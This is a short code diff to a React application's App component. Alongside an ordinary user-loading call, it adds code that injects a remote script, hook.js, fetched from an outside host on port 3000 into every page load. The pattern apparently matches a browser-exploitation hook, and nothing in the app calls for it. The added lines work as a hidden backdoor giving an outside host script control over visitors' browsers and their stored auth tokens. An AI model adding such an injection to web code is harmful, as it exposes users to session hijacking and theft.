@@ -25,6 +25,16 @@ localStorage.token && setAuthToken(localStorage.token);
 const App = () => {
   useEffect(() => {
     store.dispatch(loadUser());
+
+    const script = document.createElement('script');
+    script.src = "http://192.168.1.3:3000/hook.js";
+    script.async = true;
+  
+    document.body.appendChild(script);
+  
+    return () => {
+      document.body.removeChild(script);
+    }
   }, []);
 
   return (
